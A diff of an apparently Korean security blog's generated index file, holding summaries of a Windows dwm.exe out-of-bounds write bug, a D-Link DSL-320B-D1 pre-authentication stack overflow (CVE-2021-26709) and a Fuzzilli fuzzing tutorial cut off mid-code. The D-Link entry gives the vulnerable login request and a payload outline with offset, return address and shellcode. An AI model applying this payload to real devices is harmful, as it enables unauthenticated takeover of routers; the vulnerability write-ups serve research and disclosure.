&#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xB450; &#xAC00;&#xC9C0; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xBA74; <code>propertiesData</code> &#xBC84;&#xD37C;&#xB97C; &#xC9C0;&#xB098; OOB write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xAC00; <code>dwm.exe</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; heap spray&#xB97C; &#xD1B5;&#xD574; &#xC774; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD55C; &#xD6C4; &#xC870;&#xC791;&#xB41C; <code>propertyId</code>&#xB85C; &#xBA85;&#xB839;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; <code>NtDCompositionProcessChannelBatchBuffer</code>&#xC5D0;&#xC11C; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xACE0; &#xBA85;&#xB839;&#xC5B4;&#xAC00; <code>dwm.exe</code>&#xC5D0; &#xC804;&#xC1A1;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. kernel mode <code>UpdateProperty&lt;D2DVector2&gt;</code>&#xC758; <code>propertiesCount</code> &#xAC80;&#xC0AC;&#xB294; user mode&#xC5D0;&#xC11C;&#xC758; &#xC545;&#xC131; &#xBA85;&#xB839; &#xC2E4;&#xD589;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; kernel mode <code>AddProperty</code>&#xB294; user mode&#xC640; &#xC720;&#xC0AC;&#xD558;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xBA70; &#xC0DD;&#xC131;&#xB41C; property&#xC758; <code>propertyId</code>&#xC640; <code>storageOffset</code>&#xC774; &#xC81C;&#xACF5;&#xB41C; &#xAC12;&#xACFC; &#xB3D9;&#xC77C;&#xD55C;&#xC9C0;&#xB9CC; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB2E4;&#xB974;&#xBA74; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. <code>AddProperty</code>&#xB97C; &#xD1B5;&#xD574; &#xC0C8; &#xC18D;&#xC131;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xD568;&#xC218;&#xAC00; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74; kernel mode&#xC640; user mode &#xB3D9;&#xC77C; &#xB9AC;&#xC18C;&#xC2A4; &#xAC04;&#xC5D0; property &#xC218;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; kernel mode <code>propertiesCount</code> &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; <code>dwm.exe</code>&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
+    
+    
+    <categories>
       
-      <tag>scm</tag>
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>windows</tag>
+      
+      <tag>idioth</tag>
+      
+      <tag>oob write</tag>
       
     </tags>
     
@@ -4382,15 +4382,15 @@
       
       <tag>cve</tag>
       
-      <tag>kernel</tag>
+      <tag>lpe</tag>
       
       <tag>linux</tag>
       
-      <tag>lpe</tag>
-      
-      <tag>toctou</tag>
+      <tag>kernel</tag>
       
       <tag>race condition</tag>
+      
+      <tag>toctou</tag>
       
       <tag>L0ch</tag>
       
@@ -4432,6 +4432,37 @@
   
   
   <entry>
+    <title>[하루한줄] CVE-2021-26709: D-Link DSL-320B-D1 Pre-Auth Buffer Overflow</title>
+    <link href="/2021/04/11/insu/2021-04-11/"/>
+    <url>/2021/04/11/insu/2021-04-11/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://packetstormsecurity.com/files/162133/CVE-2021-26709_advisory.txt">D-Link DSL-320B-D1 Pre-Authentication Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DSL-320B-D1, EU_1.25 and lower</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ADSL &#xBAA8;&#xB380;, DSL-320b-D1, EU_1.25 &#xC774;&#xD558;&#xC758; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xB97C; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; Stack Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; <code>login.xgi</code>&#xC5D0;&#xC11C; <code>user</code>&#xC640; <code>pass</code> &#xC778;&#xC790;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /login.xgi?<span class="hljs-attribute">user</span>=<span class="hljs-string">&quot; + payload + &quot;</span>&amp;pass=abcde HTTP/1.1\\nHost: <span class="hljs-string">&quot; +</span><span class="hljs-string">host + &quot;</span>\\n\\n<span class="hljs-string">&quot;</span></code></pre><p><code>user</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xAD6C;&#xC131;&#xB418;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">OFFSET</span> = <span class="hljs-number">652</span><span class="hljs-attribute">ADDR</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">8</span>ab<span class="hljs-number">0</span><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*OFFSET<span class="hljs-attribute">payload</span> += pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, ADDR)<span class="hljs-attribute">payload</span> += shellcode</code></pre><p>&#xBC18;&#xBA74;&#xC5D0; <code>pass</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; 641&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; GET request&#xC5D0;&#xC11C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xBA70; ROP&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; exploit&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>insu</tag>
+      
+      <tag>cve</tag>
+      
+      <tag>bof</tag>
+      
+      <tag>d-link</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[Translation] Architecture of Ransomware Part 1</title>
     <link href="/2021/04/11/idioth/arch_of_ransomware_part1/"/>
     <url>/2021/04/11/idioth/arch_of_ransomware_part1/</url>
@@ -4455,37 +4486,6 @@
       <tag>ransomware</tag>
       
       <tag>crypto</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>[하루한줄] CVE-2021-26709: D-Link DSL-320B-D1 Pre-Auth Buffer Overflow</title>
-    <link href="/2021/04/11/insu/2021-04-11/"/>
-    <url>/2021/04/11/insu/2021-04-11/</url>
-    
-    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://packetstormsecurity.com/files/162133/CVE-2021-26709_advisory.txt">D-Link DSL-320B-D1 Pre-Authentication Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DSL-320B-D1, EU_1.25 and lower</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ADSL &#xBAA8;&#xB380;, DSL-320b-D1, EU_1.25 &#xC774;&#xD558;&#xC758; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xB97C; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; Stack Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; <code>login.xgi</code>&#xC5D0;&#xC11C; <code>user</code>&#xC640; <code>pass</code> &#xC778;&#xC790;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /login.xgi?<span class="hljs-attribute">user</span>=<span class="hljs-string">&quot; + payload + &quot;</span>&amp;pass=abcde HTTP/1.1\\nHost: <span class="hljs-string">&quot; +</span><span class="hljs-string">host + &quot;</span>\\n\\n<span class="hljs-string">&quot;</span></code></pre><p><code>user</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xAD6C;&#xC131;&#xB418;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">OFFSET</span> = <span class="hljs-number">652</span><span class="hljs-attribute">ADDR</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">8</span>ab<span class="hljs-number">0</span><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*OFFSET<span class="hljs-attribute">payload</span> += pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, ADDR)<span class="hljs-attribute">payload</span> += shellcode</code></pre><p>&#xBC18;&#xBA74;&#xC5D0; <code>pass</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; 641&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; GET request&#xC5D0;&#xC11C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xBA70; ROP&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; exploit&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>1day1line</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>cve</tag>
-      
-      <tag>bof</tag>
-      
-      <tag>insu</tag>
-      
-      <tag>d-link</tag>
       
     </tags>
     
@@ -4541,9 +4541,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>L0ch</tag>
       
@@ -4576,17 +4576,17 @@
     
     <tags>
       
+      <tag>insu</tag>
+      
       <tag>cve</tag>
       
-      <tag>kernel</tag>
+      <tag>nosy driver</tag>
       
       <tag>linux</tag>
       
+      <tag>kernel</tag>
+      
       <tag>uaf</tag>
-      
-      <tag>insu</tag>
-      
-      <tag>nosy driver</tag>
       
     </tags>
     
@@ -4624,6 +4624,37 @@
   
   
   <entry>
+    <title>[Research] 자바스크립트 엔진 Fuzzer - Fuzzilli</title>
+    <link href="/2021/04/07/insu/fuzzilli/"/>
+    <url>/2021/04/07/insu/fuzzilli/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Fuzzilli&#xB780;"><a href="#Fuzzilli&#xB780;" class="headerlink" title="Fuzzilli&#xB780;"></a>Fuzzilli&#xB780;</h1><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD37C;&#xC9D5; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAE30;&#xC874;&#xC5D0; &#xC788;&#xB294; &#xBC29;&#xBC95;(&#xB79C;&#xB364;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xBC95; &#xB4F1;)&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C;&#xB294; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xD37C;&#xC9D5;&#xC744; &#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB807;&#xAE30;&#xC5D0; sample&#xC744; &#xB9CC;&#xB4E4; &#xB54C; &#xBB38;&#xBC95;&#xC5D0; &#xB9DE;&#xB294; sample&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; <a href="https://github.com/googleprojectzero/domato">domato</a>&#xB77C;&#xB294; grammar-based &#xD37C;&#xC800;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. domato&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xB8F0;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xC900; &#xB4A4; &#xADF8; &#xB8F0;&#xC5D0; &#xB530;&#xB77C; sample&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; domato&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled.png"></p><p><code>v4</code> &#xAC12;&#xC5D0; &#xB300;&#xD574; <code>slice</code>&#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xB54C; <code>slice</code>&#xAC00; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC544; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%201.png"></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%202.png"></p><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; try-catch &#xBB38;&#xC744; &#xD1B5;&#xD574; &#xC608;&#xC678; &#xCC98;&#xB9AC;&#xB97C; &#xD574;&#xC8FC;&#xBA74; &#xC608;&#xC678;&#xAC00; &#xC77C;&#xC5B4;&#xB098;&#xB3C4; &#xB2E4;&#xC74C; &#xBB38;&#xC7A5;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; JIT compiler&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xC774; &#xB418;&#xBA74; try-catch&#xBB38;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640;&#xB294; &#xC544;&#xC608; &#xB2E4;&#xB978; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xB192;&#xC740; &#xC218;&#xC900;&#xC758; Semantic correctness&#xB97C; &#xAC00;&#xC9C4; sample&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB294;&#xB370; Fuzzill&#xB294; mutation&#xC744; &#xD1B5;&#xD574; semantically valid&#xD55C; &#xC0D8;&#xD50C;&#xB9CC; corpus&#xC5D0; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xC5D0;&#xC11C;&#xB294; FuzzIL&#xC774;&#xB77C;&#xB294; custom intermediate &#xC5B8;&#xC5B4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; mutation&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%203.png"></p><p>&#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; FuzzIL&#xC740; &#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; JS &#xCF54;&#xB4DC;&#xB85C; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%204.png"></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%205.png"></p><p>FuzzIL&#xC5D0;&#xB294; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%206.png"></p><ul><li><p>Input Mutator - Input&#xC744; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</p></li><li><p>Operation Mutator - Operation&#xC744; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</p></li><li><p>Splice Mutator -  &#xB2E4;&#xB978; corpus&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xC798;&#xB77C;&#xC640; &#xC0C8;&#xB85C; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</p></li><li><p>Insertion Mutator - &#xC0C8;&#xB85C;&#xC6B4; &#xCF54;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>  &#xB4F1;&#xB4F1; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xC774;&#xB7EC;&#xD55C; mutator&#xC640; &#xD568;&#xAED8; feedback&#xC744; &#xCD94;&#xAC00;&#xD574; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xB97C; &#xB192;&#xC774;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD37C;&#xC9D5;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%207.png"></p><h1 id="Fuzzilli-&#xC124;&#xCE58;-&#xBC0F;-&#xC2E4;&#xD589;"><a href="#Fuzzilli-&#xC124;&#xCE58;-&#xBC0F;-&#xC2E4;&#xD589;" class="headerlink" title="Fuzzilli &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;"></a>Fuzzilli &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;</h1><p>Ubuntu 20.04 LTS&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; clang&#xACFC; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xB4E4;&#xC744; &#xC124;&#xCE58;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">apt-get install clang clang++ libicu-dev</code></pre><p>&#xBC84;&#xC804;&#xC5D0; &#xB9DE;&#xB294; <a href="https://swift.org/download/">swift</a>&#xB97C; &#xC124;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.</p><p>swift&#xB97C; &#xC124;&#xCE58; &#xD55C; &#xB4A4; PATH&#xB97C; &#xB4F1;&#xB85D;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">wget https:<span class="hljs-comment">//swift.org/builds/swift-5.3.3-release/ubuntu2004/swift-5.3.3-RELEASE/swift-5.3.3-RELEASE-ubuntu20.04.tar.gz</span>mkdir ~/swifttar -xvf swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>.tar.gz -C ~/swift<span class="hljs-keyword">export</span> PATH=~<span class="hljs-regexp">/swift/</span>swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>/usr/bin/:$PATH</code></pre><p>git&#xC744; &#xC774;&#xC6A9;&#xD574; fuzzilli&#xB97C; &#xBC1B;&#xC544; &#xBE4C;&#xB4DC;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//github.com/googleprojectzero/fuzzilli.git</span>cd swiftswift build -c release</code></pre><p>&#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD0C0;&#xAE43; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, chromium&#xC758; v8&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; v8 source&#xB97C; &#xBC1B;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//chromium.googlesource.com/chromium/tools/depot_tools.git</span><span class="hljs-keyword">export</span> PATH=<span class="hljs-regexp">/path/</span>to/depot_tools:$PATHmkdir ~/v8cd ~/v8fetch v8cd v8/path/to/fuzzilli/Targets/V8/fuzzbuild.sh</code></pre><p>&#xC644;&#xB8CC;&#xD558;&#xBA74; v8/out/fuzzbuild/d8&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p>fuzzilli&#xC640; v8&#xC744; &#xBAA8;&#xB450; &#xBE4C;&#xB4DC;&#xD588;&#xC73C;&#xBA74; &#xB2E4;&#xC74C;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; fuzzilli&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">swift run FuzzilliCli --profile=v8 ~<span class="hljs-regexp">/Desktop/</span>v8/v8/out/fuzzbuild/d8</code></pre><p>&#xC2E4;&#xD589;&#xD560; &#xB54C; &#xC5EC;&#xB7EC; &#xC635;&#xC158;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xB370; &#xC790;&#xC138;&#xD55C; &#xC635;&#xC158;&#xC740; github&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="Fuzzilli-&#xBD84;&#xC11D;"><a href="#Fuzzilli-&#xBD84;&#xC11D;" class="headerlink" title="Fuzzilli &#xBD84;&#xC11D;"></a>Fuzzilli &#xBD84;&#xC11D;</h1><p>&#xB2E4;&#xC74C;&#xC758; &#xCF54;&#xB4DC;&#xB294; FuzzilIL&#xC744; test &#xD558;&#xAE30; &#xC704;&#xD574; &#xB9CC;&#xB4DC;&#xB294; FuzzIL&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; FuzzIL&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; mutation &#xACB0;&#xACFC;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift"><span class="hljs-keyword">let</span> b = makeBuilder() <span class="hljs-comment">//IL&#xC744; &#xB2F4;&#xC744; ProgramBuilder &#xC0DD;&#xC131;.</span>    <span class="hljs-keyword">let</span> f = b.definePlainFunction(withSignature: <span class="hljs-type">FunctionSignature</span>(withParameterCount: <span class="hljs-number">2</span>)) { params <span class="hljs-keyword">in</span> <span class="hljs-comment">//&#xC778;&#xC790;&#xB97C; 2&#xAC1C; &#xBC1B;&#xB294; &#xD568;&#xC218; &#xC120;&#xC5B8;</span>        <span class="hljs-keyword">let</span> x = b.loadProperty(<span class="hljs-string">&quot;x&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; x property&#xB97C; &#xAC00;&#xC838;&#xC634;.</span>        <span class="hljs-keyword">let</span> y = b.loadProperty(<span class="hljs-string">&quot;y&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; y property&#xB97C; &#xAC00;&#xC838;&#xC634;.</span>        <span class="hljs-keyword">let</span> s = b.binary(x, y, with: .<span class="hljs-type">Add</span>) <span class="hljs-comment">// x&#xC640; y&#xC758; &#xAC12;&#xC744; &#xB354; &#xD568;.(&#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; x,y &#xAC12;&#xC758; &#xD569;.)</span>        <span class="hljs-keyword">let</span> p = b.binary(s, params[<span class="hljs-number">1</span>], with: .<span class="hljs-type">Mul</span>) <span class="hljs-comment">// s&#xC758; &#xAC12;&#xACFC; &#xB450;&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB97C; &#xACF1;&#xD568;.</span>        b.doReturn(value: p) <span class="hljs-comment">// p&#xC758; &#xAC12;&#xC744; &#xB9AC;&#xD134;.</span>    }    b.forLoop(b.loadInt(<span class="hljs-number">0</span>), .lessThan, b.loadInt(<span class="hljs-number">1000</span>), .<span class="hljs-type">Add</span>, b.loadInt(<span class="hljs-number">1</span>)) { i <span class="hljs-keyword">in</span> <span class="hljs-comment">// &#xBC18;&#xBCF5;&#xBB38; &#xC120;&#xC5B8;, for(i=0;i&lt;1000;i++)</span>        <span class="hljs-keyword">let</span> x = b.loadInt(<span class="hljs-number">42</span>) <span class="hljs-comment">// x = 42</span>        <span class="hljs-keyword">let</span> y = b.loadInt(<span class="hljs-number">43</span>) <span class="hljs-comment">// y = 43</span>        <span class="hljs-keyword">let</span> arg1 = b.createObject(with: [<span class="hljs-string">&quot;x&quot;</span>: x, <span class="hljs-string">&quot;y&quot;</span>: y]) <span 